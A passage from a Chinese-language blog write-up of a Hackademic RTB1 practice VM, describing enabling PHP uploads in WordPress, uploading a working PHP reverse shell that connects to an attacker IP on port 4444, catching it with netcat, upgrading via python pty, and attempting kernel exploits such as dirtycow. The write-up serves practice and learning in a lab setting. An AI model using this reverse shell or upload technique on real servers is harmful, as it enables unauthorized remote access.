<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/42cd38ce-ffa0-4d56-8bec-72e3d8a39f60"><img width="1919" height="1035" alt="Image" src="https://github.com/user-attachments/assets/42cd38ce-ffa0-4d56-8bec-72e3d8a39f60" style="max-width: 100%; height: auto; max-height: 1035px;"></a></p>
<p>在这里发现添加允许 php 文件上传</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e2908153-3c01-4d9c-8a80-bf29809da4ee"><img width="1918" height="1034" alt="Image" src="https://github.com/user-attachments/assets/e2908153-3c01-4d9c-8a80-bf29809da4ee" style="max-width: 100%; height: auto; max-height: 1034px;"></a></p>
上传webshell
但后在upload上传shell文件，很奇怪说我上传的文件以存在，难道是上面 link  上传虽然有报错但是还是成功上传了吗。后面登录上去之后发现之前上的 shell.php 也在，说明前面虽然报错了，但是任然上传成功了。
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0c0478c5-e01c-4e66-96cf-aba9bf3c0493"><img width="1912" height="1031" alt="Image" src="https://github.com/user-attachments/assets/0c0478c5-e01c-4e66-96cf-aba9bf3c0493" style="max-width: 100%; height: auto; max-height: 1031px;"></a></p>
<p>我是上传的反弹shell</p>
<pre class="notranslate"><code class="notranslate">&lt;?php
$ip = '192.168.218.148';  
$port = 4444;             
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', 
    array(0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock), 
    $pipes);
?&gt;
</code></pre>
<p>在kali上 <strong>nc -lvnp 4444</strong> 设置监听，然后访问  <strong>ip/Hackademic_RTB1/wp-content/rev_01.php</strong> 反弹shell</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b4a9efc-af05-4443-bc0f-6227f9855116"><img width="1917" height="94" alt="Image" src="https://github.com/user-attachments/assets/3b4a9efc-af05-4443-bc0f-6227f9855116" style="max-width: 100%; height: auto; max-height: 94px;"></a></p>
<p>python升级shell然后开始提权<br>
<code class="notranslate">python -c 'import pty;pty.spawn("/bin/bash")'</code></p>
<p>翻了很半天也没翻到什么有用的信息，就知道还有一个p0wnbox.team用户，那就上传linpeas扫描一下，发现有可能有 <strong>dirtycow</strong> 漏洞利用，试了一下exp，不行，在uname找一下有没有版本漏洞，又找到很多， 都试一下，试了很久都没成功，几乎所有的exp都试过了还是没有用，后面掉兔子洞了，又回去研究p0wnbox.team用户，卡了很久也没办法，看了wp。<br>
需要使用下面的第二个exp，并且还需要扒到靶机上编译执行，不然会报错。<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e6510aa2-9981-40cb-8c54-68f11ca48384"><img width="1919" height="97" alt="Image" src="https://github.com/user-attachments/assets/e6510aa2-9981-40cb-8c54-68f11ca48384" style="max-width: 100%; height: auto; max-height: 97px;"></a></p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0d248cdf-505e-4948-909e-9ba5ae386aea"><img width="1919" height="584" alt="Image" src="https://github.com/user-attachments/assets/0d248cdf-505e-4948-909e-9ba5ae386aea" style="max-width: 100%; height: auto; max-height: 584px;"></a></p>
<h2>反思</h2>
<p>这一台靶机前面拿shell的过程那可以一环套一环，一直有路子走，但是后面提权的部分，寻找exp的能力还是不行，导致被卡了很久，还需要着重练习一下提权姿势。这一台靶机也是非常接近实战，几乎是没有什么提示的，是很好的一台靶机。</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://dehua-rd.github.io">dehua</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

let themeSettings={
    "dark": ["dark","moon","#00f0ff","dark-blue"],
    "light": ["light","sun","#ff5000","github-light"],
    "auto": ["auto","sync","","preferred-color-scheme"]
};
function changeTheme(mode, icon, color, utheme){
    document.documentElement.setAttribute("data-color-mode",mode);
    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
    document.getElementById("themeSwitch").parentNode.style.color=color;
    if(utterancesLoad==1){utterancesTheme(utheme);}
}
function modeSwitch(){
    let currentMode=document.documentElement.getAttribute('data-color-mode');
    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
    localStorage.setItem("meek_theme", newMode);
    if(themeSettings[newMode]){
        changeTheme(...themeSettings[newMode]);
    }
}
function utterancesTheme(theme){
    const message={type:'set-theme',theme: theme};
    const iframe=document.getElementsByClassName('utterances-frame')[0];
    iframe.contentWindow.postMessage(message,'https://utteranc.es');
}
if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","dehua-rd/dehua-rd.github.io");
    script.setAttribute("issue-term","title");
    
    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
    else{script.setAttribute("theme","preferred-color-scheme");}
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>


</html>
